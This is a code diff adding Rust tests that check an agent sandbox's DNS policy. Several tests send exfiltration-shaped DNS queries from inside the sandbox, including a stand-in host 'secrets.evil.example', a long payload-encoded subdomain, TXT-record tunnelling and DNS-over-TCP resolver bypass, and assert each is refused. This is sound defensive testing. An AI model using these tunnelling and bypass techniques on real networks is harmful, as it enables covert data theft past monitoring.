@@ -533,3 +533,217 @@ except Exception as e:
     );
     s.stop().await;
 }
+
+// ---------------------------------------------------------------------------
+// DNS: the layer that makes *name* rules enforceable
+// ---------------------------------------------------------------------------
+
+/// Send one DNS query from inside the sandbox and report the response code.
+///
+/// Built by hand rather than shelling out to `dig`, which is not guaranteed to exist
+/// in the host `/usr` the sandbox borrows. `server` is deliberately a parameter: every
+/// packet to port 53 is redirected regardless of where it was aimed, and some of these
+/// tests depend on that.
+///
+/// Response codes: 0 NOERROR, 3 NXDOMAIN, 5 REFUSED.
+fn dns_probe(qname: &str, qtype: u16, server: &str) -> String {
+    format!(
+        r#"python3 -c '
+import socket, struct, random
+header = struct.pack(">HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
+labels = b""
+for part in "{qname}".split("."):
+    if part:
+        labels += bytes([len(part)]) + part.encode()
+labels += b"\x00"
+msg = header + labels + struct.pack(">HH", {qtype}, 1)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(8)
+try:
+    s.sendto(msg, ("{server}", 53))
+    data, _ = s.recvfrom(4096)
+    print("RCODE", data[3] & 15, "ANSWERS", struct.unpack(">H", data[6:8])[0])
+except Exception as e:
+    print("NOANSWER", type(e).__name__)
+'"#
+    )
+}
+
+/// The payoff of the whole DNS path. Until DNS was policed, only IP and CIDR rules
+/// could match, because nothing recorded which name an address belonged to — a rule
+/// like `allow: example.com` was unenforceable. This asserts the two halves together:
+/// the name resolves, *and* the answer is what authorizes the connection that follows.
+///
+/// The control matters as much as the assertion: under the same policy a bare IP with
+/// no recorded name stays blocked, so this cannot pass by the policy being loose.
+#[tokio::test]
+async fn an_allow_listed_name_is_reachable_by_name() {
+    skip_if_unsupported!();
+    skip_if_offline!();
+    let p = Project::new();
+    let s = sandbox_with(
+        &p.path(),
+        allow_only("example.com"),
+        Arc::new(cowboy_gateway::DenyAll),
+    );
+
+    let (_, out) = run(&s, &connect_probe("example.com", 443)).await;
+    assert!(
+        out.contains("CONNECTED yes"),
+        "an allow-listed *name* must resolve and then be reachable: {out}"
+    );
+
+    let (_, control) = run(&s, &connect_probe("1.1.1.1", 443)).await;
+    assert!(
+        control.contains("BLOCKED"),
+        "the same policy must still block an address it never resolved, or the test \
+         above proves nothing about names: {control}"
+    );
+    s.stop().await;
+}
+
+/// Interception, demonstrated rather than assumed: a query aimed at a *public*
+/// resolver is still answered by cowboy's policy. If the packet had reached `8.8.8.8`
+/// the answer would be NXDOMAIN (3); REFUSED (5) can only have come from the
+/// host-side resolver.
+///
+/// This is also what stops the obvious workaround — the agent picking its own
+/// resolver, by `dig @8.8.8.8` or by writing its own `resolv.conf`.
+#[tokio::test]
+async fn a_query_aimed_at_a_public_resolver_is_still_answered_by_policy() {
+    skip_if_unsupported!();
+    let p = Project::new();
+    let mut policy = allow_only("example.com");
+    policy.deny.domains.push("evil.example".into());
+    let s = sandbox_with(&p.path(), policy, Arc::new(cowboy_gateway::DenyAll));
+
+    let (_, out) = run(&s, &dns_probe("secrets.evil.example", 1, "8.8.8.8")).await;
+    assert!(
+        out.contains("RCODE 5"),
+        "a denied name must be REFUSED by cowboy no matter which resolver it was \
+         addressed to (NXDOMAIN would mean the query left the machine): {out}"
+    );
+    s.stop().await;
+}
+
+/// A denied name is refused, and the refusal happens without the query leaving the
+/// host — the query *is* the exfiltration channel, so there is no later connection to
+/// gate. Needs no internet: the refusal is generated locally.
+#[tokio::test]
+async fn a_denied_name_is_refused_by_the_resolver() {
+    skip_if_unsupported!();
+    let p = Project::new();
+    let mut policy = allow_only("example.com");
+    policy.deny.domains.push("evil.example".into());
+    let s = sandbox_with(&p.path(), policy, Arc::new(cowboy_gateway::DenyAll));
+
+    let (_, out) = run(&s, &dns_probe("evil.example", 1, "127.0.0.53")).await;
+    assert!(
+        out.contains("RCODE 5"),
+        "a denied name must be REFUSED: {out}"
+    );
+    s.stop().await;
+}
+
+/// TXT is the classic tunnel and C2 carrier, and is refused even for a name the
+/// policy otherwise allows — the record type is gated independently of the name.
+#[tokio::test]
+async fn a_tunnel_prone_record_type_is_refused_even_for_an_allowed_name() {
+    skip_if_unsupported!();
+    let p = Project::new();
+    let s = sandbox_with(
+        &p.path(),
+        allow_only("example.com"),
+        Arc::new(cowboy_gateway::DenyAll),
+    );
+
+    // 16 = TXT.
+    let (_, out) = run(&s, &dns_probe("example.com", 16, "127.0.0.53")).await;
+    assert!(
+        out.contains("RCODE 5"),
+        "TXT must be refused even for an allowed name: {out}"
+    );
+    // And the same name over A still works, so the refusal is about the record type.
+    // Requiring an answer *count* matters: a NOERROR with no records would resolve
+    // nothing into the IP→name map, and so authorize nothing.
+    if online() {
+        let (_, a) = run(&s, &dns_probe("example.com", 1, "127.0.0.53")).await;
+        assert!(
+            a.contains("RCODE 0"),
+            "the same allowed name must still resolve over A: {a}"
+        );
+        assert!(
+            !a.contains("ANSWERS 0"),
+            "the answer must actually carry records: {a}"
+        );
+    }
+    s.stop().await;
+}
+
+/// Data smuggled in the *name* is caught even under an allowed parent domain, which is
+/// the case a name allow-list alone cannot handle: `<payload>.example.com` matches
+/// `example.com`.
+#[tokio::test]
+async fn a_tunnel_shaped_name_is_refused_under_an_allowed_parent() {
+    skip_if_unsupported!();
+    let p = Project::new();
+    let s = sandbox_with(
+        &p.path(),
+        allow_only("example.com"),
+        Arc::new(cowboy_gateway::DenyAll),
+    );
+
+    // A 48-character subdomain label: over the 40-char threshold, so this trips
+    // deterministically rather than on an entropy estimate.
+    let payload = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718";
+    let (_, out) = run(
+        &s,
+        &dns_probe(&format!("{payload}.example.com"), 1, "127.0.0.53"),
+    )
+    .await;
+    assert!(
+        out.contains("RCODE 5"),
+        "an exfiltration-shaped name under an allowed parent must be refused: {out}"
+    );
+    s.stop().await;
+}
+
+/// The resolver is the host's, and the sandbox is never told which one it is. Nothing
+/// inside the boundary holds a resolver address, a policy, or a parser — so there is
+/// no DNS decision in there to subvert.
+#[tokio::test]
+async fn the_sandbox_cannot_reach_a_resolver_of_its_own() {
+    skip_if_unsupported!();
+    skip_if_offline!();
+    let p = Project::new();
+    let s = sandbox_with(
+        &p.path(),
+        allow_only("example.com"),
+        Arc::new(cowboy_gateway::DenyAll),
+    );
+
+    // DNS over TCP is the way around a UDP-only interception. It must dead-end: sent
+    // to the relay instead, it would be dialled on the host as an ordinary connection
+    // to a resolver and carry queries past every gate above.
+    let (_, out) = run(
+        &s,
+        r#"python3 -c '
+import socket
+s = socket.socket(); s.settimeout(6)
+try:
+    s.connect(("8.8.8.8", 53))
+    s.sendall(b"\x00\x1d" + b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
+              b"\x07example\x03com\x00\x00\x01\x00\x01")
+    data = s.recv(64)
+    print("TCP DNS ANSWERED", len(data))
+except Exception as e:
+    print("TCP DNS BLOCKED", type(e).__name__)
+'"#,
+    )
+    .await;
+    assert!(
+        !out.contains("TCP DNS ANSWERED") || out.contains("TCP DNS ANSWERED 0"),
+        "DNS over TCP must not reach a resolver: {out}"
+    );
+    s.stop().await;
+}
